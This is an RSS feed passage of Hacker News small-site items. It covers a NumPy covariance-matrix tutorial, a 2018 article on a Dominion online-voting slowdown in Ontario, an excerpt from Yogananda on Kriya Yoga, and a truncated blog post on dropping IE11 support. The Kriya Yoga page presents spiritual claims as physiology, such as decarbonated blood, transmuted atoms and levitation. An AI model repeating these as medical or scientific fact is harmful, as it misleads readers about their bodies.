1).</p><p><img src="https://hadrienj.github.io/assets/images/Preprocessing-for-deep-learning/covariance2.png" width="400" alt="Covariance in the matrix of covariance" title="The position in the covariance matrix."> <em>The position in the covariance matrix. Column corresponds to the first variable and row to the second (or the opposite). The covariance between the first and the third column vector of $\bs{A}$ is the element in column 1 and row 3 (or the opposite = same value).</em></p><p>Let’s check that the covariance between the first and the third column vector of $\bs{A}$ is equal to $-2.67$. The formula of the covariance between two variables $\bs{X}$ and $\bs{Y}$ is:</p><p>$ cov(\bs{X},\bs{Y}) = \frac{1}{n} \sum_{i=1}^{n}(x_i-\bar{x})(y_i-\bar{y}) $</p><p>The variables $\bs{X}$ and $\bs{Y}$ are the first and the third column vectors in the last example. Let’s split this formula to be sure that it is crystal clear:</p><ol><li>$(x_1-\bar{x})$. The sum symbol means that we will iterate on the elements of the vectors. We will start with the first element ($i=1$) and calculate the first element of $\bs{X}$ minus the mean of the vector $\bs{X}$.</li><li>$(x_1-\bar{x})(y_1-\bar{y})$. Multiply the result with the first element of $\bs{Y}$ minus the mean of the vector $\bs{Y}$.</li><li>$\sum_{i=1}^{n}(x_i-\bar{x})(y_i-\bar{y})$. Reiterate the process for each element of the vectors and calculate the sum of all results.</li><li>$\frac{1}{n} \sum_{i=1}^{n}(x_i-\bar{x})(y_i-\bar{y})$. Divide by the number of elements in the vector.</li></ol><h4 id="example-1">Example 1.</h4><p>Let’s start with the matrix $\bs{A}$:</p><p>$ \boldsymbol{A}= \begin{bmatrix} 1 &amp; 3 &amp; 5 \\ 5 &amp; 4 &amp; 1 \\ 3 &amp; 8 &amp; 6 \end{bmatrix} $</p><p>We will calculate the covariance between the first and the third column vectors:</p><p>$ \boldsymbol{X} = \begin{bmatrix} 1 \\ 5 \\ 3 \end{bmatrix} $</p><p>and</p><p>$\boldsymbol{Y} = \begin{bmatrix} 5 \\ 1 \\ 6 \end{bmatrix} $</p><p>$\boldsymbol{\bar{x}}=3$, $\boldsymbol{\bar{y}}=4$ and $n=3$ so we have:</p><p>$ cov(X,Y) = \frac{(1-3)(5-4)+(5-3)(1-4)+(3-3)(6-4)}{3}=\frac{-8}{3}=-2.67 $</p><p>Ok, great! That the value of the covariance matrix.</p><p>Now the easy way! With Numpy, the covariance matrix can be calculated with the function <code>np.cov</code>. It is worth noting that if you want Numpy to use the columns as vectors, the parameter <code>rowvar=False</code> has to be used. Also, <code>bias=True</code> allows to divide by $n$ and not by $n-1$.</p><p>Let’s create the array first:</p><div><div><pre><code><span>A</span> <span>=</span> <span>np</span><span>.</span><span>array</span><span>([[</span><span>1</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>],</span> <span>[</span><span>5</span><span>,</span> <span>4</span><span>,</span> <span>1</span><span>],</span> <span>[</span><span>3</span><span>,</span> <span>8</span><span>,</span> <span>6</span><span>]])</span>
<span>A</span>
</code></pre></div></div><pre>array([[1, 3, 5],
       [5, 4, 1],
       [3, 8, 6]])
</pre><p>Now we will calculate the covariance with the Numpy function:</p><div><div><pre><code><span>np</span><span>.</span><span>cov</span><span>(</span><span>A</span><span>,</span> <span>rowvar</span><span>=</span><span>False</span><span>,</span> <span>bias</span><span>=</span><span>True</span><span>)</span>
</code></pre></div></div><pre>array([[ 2.66666667,  0.66666667, -2.66666667],
       [ 0.66666667,  4.66666667,  2.33333333],
       [-2.66666667,  2.33333333,  4.66666667]])
</pre><p>Looks good!</p><h3 id="finding-the-covariance-matrix-with-the-dot-product">Finding the covariance matrix with the dot product</h3><p>There is another way to compute the covariance matrix of $\bs{A}$. You can center $ \bs{A}$ around 0 (subtract the mean of the vector to each element of the vector to have a vector of mean equal to 0, <em>cf</em>. below), multiply it with its own transpose and divide by the number of observations. Let’s start with an implementation and then we’ll try to understand the link with the previous equation:</p><div><div><pre><code><span>def</span> <span>calculateCovariance</span><span>(</span><span>X</span><span>):</span>
    <span>meanX</span> <span>=</span> <span>np</span><span>.</span><span>mean</span><span>(</span><span>X</span><span>,</span> <span>axis</span> <span>=</span> <span>0</span><span>)</span>
    <span>lenX</span> <span>=</span> <span>X</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>]</span>
    <span>X</span> <span>=</span> <span>X</span> <span>-</span> <span>meanX</span>
    <span>covariance</span> <span>=</span> <span>X</span><span>.</span><span>T</span><span>.</span><span>dot</span><span>(</span><span>X</span><span>)</span><span>/</span><span>lenX</span>
    <span>return</span> <span>covariance</span>
</code></pre></div></div><p>Let’s test it on our matrix $\boldsymbol{A}$:</p><pre>array([[ 2.66666667,  0.66666667, -2.66666667],
       [ 0.66666667,  4.66666667,  2.33333333],
       [-2.66666667,  2.33333333,  4.66666667]])
</pre><p>We end up with the same result as before!</p><p>The explanation is simple. The dot product between two vectors can be expressed:</p><p>$ \bs{X^\text{T}Y}= \sum_{i=1}^{n}(x_i)(y_i) $</p><p>That’s right, it is the sum of the products of each element of the vectors:</p><p><img src="https://hadrienj.github.io/assets/images/Preprocessing-for-deep-learning/dot-product.png" width="400" alt="The dot product corresponds to the sum of the products of each elements of the vectors" title="The dot product."> <em>The dot product corresponds to the sum of the products of each element of the vectors.</em></p><p>If $n$ is the number of elements in our vectors and that we divide by $n$:</p><p>$ \frac{1}{n}\bs{X^\text{T}Y}= \frac{1}{n}\sum_{i=1}^{n}(x_i)(y_i) $</p><p>You can note that this is not too far from the formula of the covariance we have seen above:</p><p>$ cov(\bs{X},\bs{Y}) = \frac{1}{n} \sum_{i=1}^{n}(x_i-\bar{x})(y_i-\bar{y}) $</p><p>The only difference is that in the covariance formula we subtract the mean of a vector to each of its elements. This is why we need to center the data before doing the dot product.</p><p>Now if we have a matrix $\bs{A}$, the dot product between $\bs{A}$ and its transpose will give you a new matrix:</p><p><img src="https://hadrienj.github.io/assets/images/Preprocessing-for-deep-learning/covariance-dot-product.png" width="400" alt="Covariance matrix and dot product" title="Covariance matrix and dot product."> <em>If you start with a zero-centered matrix, the dot product between this matrix and its transpose will give you the variance of each vector and covariance between them, that is to say the covariance matrix.</em></p><p>This is the covariance matrix! 🌵</p><h2 id="b-visualize-data-and-covariance-matrices">B. Visualize data and covariance matrices</h2><p>In order to get more insights about the covariance matrix and how it can be useful, we will create a function used to visualize it along with 2D data. You will be able to see the link between the covariance matrix and the data.</p><p>This function will calculate the covariance matrix as we have seen above. It will create two subplots: one for the covariance matrix and one for the data. The <code>heatmap</code> function from Seaborn is used to create gradients of color: small values will be colored in light green and large values in dark blue. The data is represented as a scatterplot. We choose one of our palette colors, but you may prefer other colors 🌈.</p><div><div><pre><code><span>def</span> <span>plotDataAndCov</span><span>(</span><span>data</span><span>):</span>
    <span>ACov</span> <span>=</span> <span>np</span><span>.</span><span>cov</span><span>(</span><span>data</span><span>,</span> <span>rowvar</span><span>=</span><span>False</span><span>,</span> <span>bias</span><span>=</span><span>True</span><span>)</span>
    <span>print</span> <span>'Covariance matrix:</span><span>\n</span><span>'</span><span>,</span> <span>ACov</span>

    <span>fig</span><span>,</span> <span>ax</span> <span>=</span> <span>plt</span><span>.</span><span>subplots</span><span>(</span><span>nrows</span><span>=</span><span>1</span><span>,</span> <span>ncols</span><span>=</span><span>2</span><span>)</span>
    <span>fig</span><span>.</span><span>set_size_inches</span><span>(</span><span>10</span><span>,</span> <span>10</span><span>)</span>

    <span>ax0</span> <span>=</span> <span>plt</span><span>.</span><span>subplot</span><span>(</span><span>2</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>)</span>

    <span># Choosing the colors
</span>    <span>cmap</span> <span>=</span> <span>sns</span><span>.</span><span>color_palette</span><span>(</span><span>"GnBu"</span><span>,</span> <span>10</span><span>)</span>
    <span>sns</span><span>.</span><span>heatmap</span><span>(</span><span>ACov</span><span>,</span> <span>cmap</span><span>=</span><span>cmap</span><span>,</span> <span>vmin</span><span>=</span><span>0</span><span>)</span>

    <span>ax1</span> <span>=</span> <span>plt</span><span>.</span><span>subplot</span><span>(</span><span>2</span><span>,</span> <span>2</span><span>,</span> <span>2</span><span>)</span>

    <span># data can include the colors
</span>    <span>if</span> <span>data</span><span>.</span><span>shape</span><span>[</span><span>1</span><span>]</span><span>==</span><span>3</span><span>:</span>
        <span>c</span><span>=</span><span>data</span><span>[:,</span><span>2</span><span>]</span>
    <span>else</span><span>:</span>
        <span>c</span><span>=</span><span>"#0A98BE"</span>
    <span>ax1</span><span>.</span><span>scatter</span><span>(</span><span>data</span><span>[:,</span><span>0</span><span>],</span> <span>data</span><span>[:,</span><span>1</span><span>],</span> <span>c</span><span>=</span><span>c</span><span>,</span> <span>s</span><span>=</span><span>40</span><span>)</span>

    <span># Remove the top and right axes from the data plot
</span>    <span>ax1</span><span>.</span><span>spines</span><span>[</span><span>'right'</span><span>].</span><span>set_visible</span><span>(</span><span>False</span><span>)</span>
    <span>ax1</span><span>.</span><span>spines</span><span>[</span><span>'top'</span><span>].</span><span>set_visible</span><span>(</span><span>False</span><span>)</span>
</code></pre></div></div><h2 id="c-simulating-data">C. Simulating data</h2><p>Now that we have the plot function, we will generate some random data to visualize what the covariance matrice can tell us. We will start with some data drawn from …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hadrienj.github.io/posts/Preprocessing-for-deep-learning/">https://hadrienj.github.io/posts/Preprocessing-for-deep-learning/</a></em></p>]]>
            </description>
            <link>https://hadrienj.github.io/posts/Preprocessing-for-deep-learning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25078004</guid>
            <pubDate>Fri, 13 Nov 2020 02:05:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Jason Scott: Your Pal, the Internet Archive, and how to use it. [video]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077936">thread link</a>) | @toomuchtodo
<br/>
November 12, 2020 | https://www.twitch.tv/videos/797446891?t=0h20m45s | <a href="https://web.archive.org/web/*/https://www.twitch.tv/videos/797446891?t=0h20m45s">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.twitch.tv/videos/797446891?t=0h20m45s</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077936</guid>
            <pubDate>Fri, 13 Nov 2020 01:53:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dominion Voting Systems – Interview with CEO John Poulos (2014) [audio]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077869">thread link</a>) | @halturing
<br/>
November 12, 2020 | https://www.cbc.ca/player/play/2536496294 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/player/play/2536496294">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>Contact CBC</h3><ul><li><a href="https://cbchelp.cbc.ca/hc/en-ca/requests/new">Submit Feedback</a></li><li><a href="https://cbchelp.cbc.ca/hc/en-ca">Help Centre</a></li></ul><p>Audience Relations, CBC <br>P.O. Box 500 Station A <br>Toronto, ON <br> Canada, M5W 1E6<!-- --> </p><p>Toll-free (Canada only): <br> 1-866-306-4636</p><p>TTY/Teletype writer: <br> 1-866-220-6045</p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/player/play/2536496294</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077869</guid>
            <pubDate>Fri, 13 Nov 2020 01:44:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dominion Voting Systems – Failure in Small Town Ontario (2018)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077860">thread link</a>) | @halturing
<br/>
November 12, 2020 | https://www.bradfordtoday.ca/bradfordvotes/dominion-voting-systems-explains-what-went-wrong-with-online-voting-in-bradford-1095086 | <a href="https://web.archive.org/web/*/https://www.bradfordtoday.ca/bradfordvotes/dominion-voting-systems-explains-what-went-wrong-with-online-voting-in-bradford-1095086">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Bradford West Gwillimbury voters have until Oct. 23 at 8 p.m. to cast their ballots</p><div id="details-body" data-words="437" itemprop="articleBody">
        <p dir="ltr">The company responsible for the online voting system in Bradford West Gwillimbury has blamed the Election Night crash on a slow down caused by a Toronto-based facility.</p>

<p dir="ltr">About 51 municipalities around Ontario started experiencing slow traffic with Dominion Voting Systems around 6 p.m., according to a press release issued by the company late Monday night.</p>

<p dir="ltr">“This load issue was documented, reviewed and determined to be the result of a Toronto-based Internet Colocation provider placing an unauthorized limit on incoming voting traffic that was roughly 1/10th of the system’s designated bandwidth,” read the release.</p>

<p dir="ltr">A co-location provider is a data center facility in which a business can rent space for servers and other computer hardware.</p>

<p dir="ltr">Dominion was unaware of the problem until municipality representatives started contacting it for help and to share complaints from voters, read the release.</p>

<p dir="ltr">“Once we became aware of the problem, Dominion was able to quickly identify the source of the issue and work with the provider to resolve all issues with the system service by 7:30 p.m.,” read the release.</p>

<p dir="ltr">“Unfortunately, the 90-minute slowdown and resulting bandwidth issue caused a varying number of voters to experience slow response times and system time-outs.”</p>

<p dir="ltr">Many communities affected by the crash have extended the voting period. In BWG, residents have until 8 p.m. today to cast their ballots.</p>

<p dir="ltr">The town will also be hosting an Election Night gathering at the Bradford and District Memorial Community Centre at 7:30 p.m.</p>

<p dir="ltr">“Dominion regrets the challenges that our system load issue posed for both election officials and voters alike in today’s elections,” read the Dominion release.</p>

<p dir="ltr">“We want to assure Ontario voters that we will work to ensure this problem does not occur in future elections. It is important to note that at no time was the integrity of the system at risk of compromise, or in any way insecure.”</p>

<p dir="ltr">As of Monday morning, 5,603 votes had been submitted in the BWG municipal election, making up a little more than 23 per cent of the eligible voters, according to Caleigh Clubine, the town’s community relations officer.</p>

<p dir="ltr">At an election gathering Monday evening, several BWG candidates said their confidence in online voting is now lacking.</p>

<p dir="ltr">“If you voted early, it worked really good, (but) you have to have the proper services. You’ll get a large volume (and if you are not prepared for that) you haven’t done your job,” said Ward 4 incumbent Ron Orr.</p>

<p dir="ltr">“Does it shake our confidence in the system? Sure it does,” added Deputy Mayor James Leduc. “I’m frustrated the system wasn’t stress-tested enough. We won’t be strictly online voting again. We’ll have both systems again.”</p>

    </div></div>]]>
            </description>
            <link>https://www.bradfordtoday.ca/bradfordvotes/dominion-voting-systems-explains-what-went-wrong-with-online-voting-in-bradford-1095086</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077860</guid>
            <pubDate>Fri, 13 Nov 2020 01:42:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kriya Yoga]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25077810">thread link</a>) | @whereistimbo
<br/>
November 12, 2020 | http://yogananda.com.au/kriya.html | <a href="https://web.archive.org/web/*/http://yogananda.com.au/kriya.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <article>
        
<h2 id="science">The Science of Kriya Yoga</h2>
      <p><em>Excerpts from  Autobiography of a Yogi by Paramahansa Yogananda</em></p>
      <p><em>Kriya Yoga</em> is a simple, psychophysiological method by which human blood is decarbonated and recharged with oxygen. The atoms of this extra oxygen are transmuted into life current to rejuvenate the brain and spinal centers. By stopping the accumulation of venous blood, the yogi is able to lessen or prevent the decay of tissues. The advanced yogi transmutes his cells into energy. Elijah, Jesus, Kabir, and other prophets were past masters in the use of <em>Kriya</em> or a similar technique, by which they caused their bodies to materialize and dematerialize at will. </p>
<p><em>Kriya</em> is an ancient science. Lahiri Mahasaya received it from his great guru, Babaji, who rediscovered and clarified the technique after it had been lost in the Dark Ages. Babaji renamed it, simply, <em>Kriya Yoga</em>.</p>


<p>"The <em>Kriya Yoga</em> that I am giving to the world through you in this nineteenth century," Babaji told Lahiri Mahasaya, "is a revival of the same science that Krishna gave millenniums ago to Arjuna; and that was later known to Patanjali and Christ, and to St. John, St. Paul, and other disciples.”</p>
<figure>
  <figcaption><b>TRANSMISSION OF KRIYA YOGA</b></figcaption><img src="http://yogananda.com.au/img/gurus_img/kriya_transmission530.jpg" alt="Kriya Yoga "></figure>

      <h2>Kriya Yoga in  the Bhagavad Gita</h2>
      <p> <em>Kriya Yoga</em> is twice referred to by Lord Krishna, India’s greatest prophet, in the Bhagavad-Gita. One stanza reads: </p>
      <p>"Offering the inhaling breath into the exhaling breath and offering the exhaling breath into the inhaling breath, the yogi neutralizes both breaths; thus he releases prana from the heart and brings life force under his control." <em><br>
        —The Bhagavad Gita IV:29</em></p>
      <p>The interpretation is: “The yogi arrests decay in the body by securing an additional supply of prana (life force) through quieting the action of the lungs and heart; he also arrests mutations of growth in the body by control of apana (eliminating current). Thus neutralizing decay and growth, the yogi learns life-force control." </p>
      <p>Another Gita stanza states: </p>
      <p>"That meditation-expert (<em>muni</em>) becomes eternally free who, seeking the Supreme Goal, is able to withdraw from external phenomena by fixing his gaze within the mid-spot of the eyebrows and by neutralizing the even currents of <em>prana</em> and <em>apana</em> [that flow] within the nostrils and lungs; and to control his sensory mind and intellect; and to banish desire, fear, and anger.” <br>
        —<em>The Bhagavad Gita V:27-28</em></p>
      <p><img src="http://yogananda.com.au/img/orna/aum2_gray.gif" alt="" width="19" height="20"></p>
      <h2>Kriya Yoga in Yoga Sutras by Patanjali</h2>
      <p><em>Kriya Yoga</em> is mentioned twice by the ancient sage Patanjali, foremost exponent of yoga, who wrote: </p>
      <p>"<em>Kriya Yoga</em> consists of <br>
        body discipline, <br>
        mental control, 
      and 
        <br>
        meditating on <em>Aum</em>." <br>
      —Yoga Sutras II:1</p>
      <p><img src="http://yogananda.com.au/img/gl/aum133.jpg" alt="yogananda.com.au" width="145" height="133">Patanjali speaks of God as the actual Cosmic Sound of <em>Aum</em> that is heard in meditation. <em>Aum</em> is the Creative Word, the whir of the Vibratory Motor, the witness of Divine Presence. Even the beginner in yoga may soon hear the wondrous sound of <em>Aum</em>. Through this blissful spiritual encouragement, he becomes convinced that he is in communion with supernal realms. </p>
      <p>Patanjali refers a second time to the <em>Kriya</em> technique or life-force control thus: </p>
      <p>"Liberation can be attained by that pranayama <br>
        which is accomplished by disjoining the course of inspiration and expiration.” <br>
      —Yoga Sutras II:49</p>
      <p><img src="http://yogananda.com.au/img/orna/aum2_gray.gif" alt="" width="19" height="20"></p>
      <h2>Accelerated Spiritual Evolution with  Kriya Yoga </h2>
      <p><img src="http://yogananda.com.au/img/pics/chakras300.gif" alt="chakras" width="300" height="428"></p>
      <p>"<em>Kriya Yoga</em> is an instrument through which human evolution can be quickened," Sri Yukteswar explained to his students. "The ancient yogis discovered that the secret of cosmic consciousness is intimately linked with breath mastery. This is India's unique and deathless contribution to the world's treasury of knowledge. The life force, which is ordinarily absorbed in maintaining heart action, must be freed for higher activities by a method of calming and stilling the ceaseless demands of the breath." </p>
      <p>The <em>Kriya</em> Yogi mentally directs his life energy to revolve, upward and downward, around the six spinal centers (medullary, cervical, dorsal, lumbar, sacral, and coccygeal plexuses), which correspond to the twelve astral signs of the zodiac, the symbolic Cosmic Man. One-half minute of revolution of energy around the sensitive spinal cord of man effects subtle progress in his evolution; that half-minute of <em>Kriya</em> equals one year of natural spiritual unfoldment.</p>
      <p><img src="http://yogananda.com.au/img/orna/aum2_gray.gif" alt="" width="19" height="20"></p>
      <p>One thousand <em>Kriyas</em> practiced in eight and a half  hours gives the yogi, in one day, the equivalent of one thousand years of natural evolution: 365,000 years of evolution in one year. In three years, a <em>Kriya Yogi</em> can thus accomplish by intelligent self-effort the same result that Nature brings to pass in a million years. The <em>Kriya</em> shortcut, of course, can be taken only by deeply developed yogis. With the guidance of a guru, such yogis have carefully prepared their body and brain to withstand the power generated by intensive practice. </p>
		<p><img src="http://yogananda.com.au/img/orna/aum2_gray.gif" alt="" width="19" height="20"></p>
      <p>The body of the average man is like a fifty-watt lamp, which cannot accommodate the billion watts of power roused by an excessive practice of <em>Kriya</em>. Through gradual and regular increase of the simple and foolproof methods of <em>Kriya</em>, man's body becomes astrally transformed day by day, and is finally fitted to express the infinite potentials of cosmic energy, which constitutes the first materially active expression of Spirit.</p>
      <p>Referring to the sure and methodical efficacy of yoga, Krishna praises the technological yogi in the following words: </p>
      <p>"The yogi is greater than body-disciplining ascetics, greater even than the followers of the path of wisdom (Jnana Yoga), or of the path of action (Karma Yoga); be thou, O disciple Arjuna, a yogi!" <br>
      —The Bhagavad Gita VI:46</p>
    <figure><img src="http://yogananda.com.au/img/pics/yogameditation550.jpg" alt="??">
    <figcaption>Yoga Meditation</figcaption></figure>
      <p><img src="http://yogananda.com.au/img/orna/aum2_gray.gif" alt="" width="19" height="20"></p>
      <h2 id="divine">From Material to Divine Consciousness</h2>
      <p>The <em>Kriya Yoga</em> meditation techniques of <em>pranayama</em>, life-force control that transmutes breath into subtle lifetronic energy, bring positive realization that the composition of the body is pure cosmic energy. </p>
      <p>In the adept practice of <em>Kriya</em>, the body is oxygenated and its atoms etherealized until it becomes light as a feather. Man has no idea how much power comes into the body when he has mastered the mystery of the breath. <em>Kriya</em> practice brings a regulated, continuous inflow of oxygen into the body, the atoms of which, by the process of <em>pranayama</em>, are transmuted into life force, reinforcing the subtle currents in the spine, which in turn awaken the astral cerebrospinal centers and spiritualize the entire body. </p>
      <p>After years of successful practice, the body of the advanced <em>Kriya Yogi</em> becomes so spiritualized that in exalted states he can hardly feel it touch the ground. The suffusion of life force becomes so powerful that the whole body loses its delusive solidity and actually levitates. I can testify to that from my own experience. But the beginner should not expect to jump weightless tomorrow! Modern man is accustomed to getting results quickly; his industry and technology manufactures products so rapidly that he thinks there should be a convenience package of concise spiritual progress as well. A presumption of instant spiritual achievement is perhaps more than a bit audacious considering the innumerable lifetimes already spent in making oneself an unspiritual being. Even a lifelong practice is little to be required. Nevertheless, the <em>Kriya Yoga</em> science and art of meditation are not drudgery, because gradual transforming results are felt from the very beginning. (p.823, <cite>The Second Coming of Christ</cite> by Paramahansa Yogananda)</p>
      <p><a href="http://yogananda.com.au/gurus/yoganandaquotes03.html">The best  Paramahansa Yogananda quotes on Kriya Yoga</a></p>
      <p><a href="http://yogananda.com.au/gita/gita0429k1.html">Next Page »</a> </p>
<p><img src="http://yogananda.com.au/img/orna/aum2_gray.gif" alt="om" width="19" height="20"></p>
</article>
      <!-- end article1 -->
    </div></div>]]>
            </description>
            <link>http://yogananda.com.au/kriya.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077810</guid>
            <pubDate>Fri, 13 Nov 2020 01:36:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dropping Support for IE11 Is Progressive Enhancement]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077805">thread link</a>) | @afrcnc
<br/>
November 12, 2020 | https://blog.carlmjohnson.net/post/2020/time-to-kill-ie11/ | <a href="https://web.archive.org/web/*/https://blog.carlmjohnson.net/post/2020/time-to-kill-ie11/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><em>TL;DR if you have to choose, you should prioritize users with no JavaScript over users with old JavaScript.</em></p><p>If you’re a web developer working today, it’s probably long passed time for you to <strong>stop transpiling your modern JavaScript into ES5 for Internet Explorer</strong>. Any time or effort spent getting your JavaScript working in IE11 is wasted time that could be better spent <strong>making a better experience for users without JavaScript</strong>. Moving your resources from Internet Explorer to users without JavaScript will let you improve the SEO and accessibility of your site while providing a better experience for everyone.</p><p>First, some notes about <em>who this advice is for</em>: I am assuming you’re working for a small team with no Quality Assurance testing department making a content focused site. If you have a large team that actually QA tests IE11, this advice may not apply to your situation. If you’re just doing personal projects for fun, you should have already dropped ES5 years ago. If you’re making more of an app than a content site, you probably should have cut off IE11 years ago, but the calculations are more complex and site specific.</p><hr><h2 id="why-drop-support-for-ie11-javascript">Why drop support for IE11 JavaScript?</h2><p>To begin with, Internet Explorer represents <strong>less than 1%</strong> of my work traffic according to Google Analytics. People will sometime spin this away by arguing that 1% of a large number is also a large number. If you have 100 million hits, 1% is 1 million hits! But the flipside is that 99 million hits are <em>not</em> Internet Explorer and are not helped by optimizations aimed at Internet Explorer. What’s more this number has been <strong>falling steadily</strong>. Even just in the year and a half that my work site has been around it has dropped. It used to be closer to 2%. On top of that, outside of corporate/enterprise settings, most of these computers browsing your site with Internet Explorer will <strong>also have Chrome installed</strong>, and approximately 100% of the users will <strong>also own a smart phone</strong> they can use to browse your site if their computer cannot display it correctly. The computers in question will be old and have <strong>terrible performance</strong> assuming you do get the JavaScript to run in the first place.</p><p>Let’s contrast this with other users we could optimize for. The number of <strong>visually impaired</strong> readers is steady and will not go down absent some breakthrough in medical technology. Visually impaired readers can’t just use another device if the site doesn’t work in the device they have in front of them. In fact, even users who have physically normal vision are impaired when driving or walking, and it seems to me inevitable that as <strong>voice assistants</strong> become ubiquitous and easy to use, sighted users having websites read aloud to them will eventually become commonplace. Plus, there are <a href="https://arstechnica.com/tech-policy/2019/10/accessibility-the-future-and-why-dominos-matters/">legal imperatives</a> to make reasonable accommodations for visually impaired readers.</p><p>Users <strong>without JavaScript</strong> are another important consideration. As Jake Archibald said, <a href="https://www.twitter.com/jaffathecake/status/207096228339658752">“All your users are non-JS while they’re downloading your JS.”</a> And remember that sometimes, your user’s connection will drop out, and <a href="https://kryogenix.org/code/browser/everyonehasjs.html">the JavaScript will never load</a>. But beyond that, browsers like Opera Mini and extensions like NoScript or overly aggressive ad blockers are already about as common as users of Internet Explorer, and they’re not going to go away. It’s hard to estimate the number of people with JavaScript broken or disabled, but <a href="https://deliberatedigital.com/blockmetry/javascript-disabled">it appears to be stable from year to year</a>, because the underlying causes aren’t subject to change, unlike IE11 usage. Year over year, old computers will be replaced, and IE11 will fade. Disliking ads and having bad connections on the other hand are here to stay. Then there are the most important users of your site without JavaScript: <strong>web spiders and search engines</strong>. While Google does in theory use headless browsers to scrape sites while executing JavaScript, in practice, you’ll still get better SEO if you optimize your content to work without it, and there are other non-Google spiders that you may want crawling your site too, like the <a href="https://cloudinary.com/blog/a_primer_on_microbrowsers_tips_and_tricks_for_managing_the_seo_feedback_loop">microbrowsers</a> which add link previews to chat and social media.</p><p>If you’re running a small site without a QA team, it’s probably worth going to <a href="https://www.browserling.com/">Browserling</a> right now and finding out if you’re even working in Internet Explorer to begin with. Browserling will let you run a virtual PC with Internet Explorer from your own browser for a limited time for free, so it’s probably easiest way to do a quick low effort <a href="https://en.wikipedia.org/wiki/Smoke_testing_(software)">smoke test</a> of your Internet Explorer support without having to install anything. Just open up a tab, take a look at your site, and see if the results surprise you.</p><p>I’ve seen developers (including most especially myself) burned by just <em>assuming</em> that <a href="https://babeljs.io/">Babel</a> and <a href="https://github.com/postcss/autoprefixer">Autoprefixer</a> have solved all their problems with IE11. You may already be dropping support for IE11, you just don’t know it yet. I’ve had sites I work on break for months at a time in Internet Explorer with no complaints from readers. One site I redesigned got just a single reader inquiry about a widget that broke in IE11 after a redesign. When I told the reader to try loading the page in Chrome, he seemed satisfied. More recently, IE11 has had some terrible rendering bugs on my site for days or months at a time that have triggered <em>zero</em> reader complaints. If I don’t QA it myself, no one else will do it for me.</p><p>If you think your code will work but haven’t actually QA tested it, it can lead to the worst of both worlds: code bloated with extras for IE11 that still doesn’t even work anyway. It’s not enough to transpile down to ES5, you also need to polyfill every missing DOM API you use, and that can be a very complicated and bloated proposition.</p><p>Essentially, there are three target web platforms you might want to support:</p><ol><li>Modern browsers</li><li>Browsers without JavaScript</li><li>Internet Explorer 11 (if you’re supporting &lt;11, 😱)</li></ol><p>If you try to support IE11 but aren’t actually QA testing it, you will probably end up with only modern browsers working. It is better to aim for both modern browser support and no-JS browser support and actually succeed than to try for IE11 support and silently fail.</p><hr><h2 id="what-should-you-do-instead-of-optimizing-ie11">What should you do instead of optimizing IE11?</h2><p>The web is built on the foundation of <strong>progressive enhancement</strong>. Deliver “good enough” service to legacy browsers, and save the enhancements for the bulk of your userbase.</p><p>In 2017, Philip Walton advocated the “<a href="https://philipwalton.com/articles/deploying-es2015-code-in-production-today/">module/nomodule</a>” pattern for JavaScript. This can be reduced to the “module/bare minimum” pattern today. Walton wrote:</p><blockquote><p>Most developers think of <code>&lt;script type="module"&gt;</code> as way to load ES modules (and of course this is true), but <code>&lt;script type="module"&gt;</code> also has a more immediate and practical use-case—loading regular JavaScript files with ES2015+ features and knowing the browser can handle it!</p><p>To put that another way, every browser that supports <code>&lt;script type="module"&gt;</code> also supports most of the ES2015+ features you know and love.</p></blockquote><p>Essentially, if you set the script element’s type attribute to an unknown value, browsers will just ignore the script. The effect of this is that IE11 will ignore the contents of any <code>&lt;script type="module"&gt;</code> tags. Modern browsers, on the other hand, will ignore the contents of <code>&lt;script nomodule&gt;</code> tags. This allows roughly targeting your JavaScript to its intended platform.</p><p>Walton goes on to advocate creating <strong>two versions of the same JavaScript bundle</strong> with Webpack. Send modern browsers a smaller, modules specific ES2015 version and older browsers a larger, transpiled and polyfilled ES5 version.</p><p>As I wrote above, I think just using Babel to turn your JavaScript into ES5 cannot be trusted to actually work without constant QA vigilance. A seemingly insignificant change in your code might silently break IE11 support, and you could be none the wiser for months or years unless you constantly recheck IE11. Instead of this futile strategy of pushing back the tide, I advocate sending IE11 users <strong>as little JavaScript as possible</strong>, ideally none, but practically speaking, <strong>probably just your ads and analytics</strong>, and then <strong>actually test</strong> that it works.</p><p>The first step is to decide what your organizational priorities are. These days most software engineers are familiar with the concept of the <a href="https://en.wikipedia.org/wiki/Minimum_viable_product">minimum viable product</a>. What’s the <em>minimum viable experience</em> that you’re willing to deliver to IE users? Maybe you’re not ready to write them off completely and just deliver a broken page and a “Best Viewed in Chrome” icon. But you may be willing to say that as long as they view your ads, you don’t care if they can bypass the paywall or can’t comment on articles. In my case, I want Internet Explorer using readers 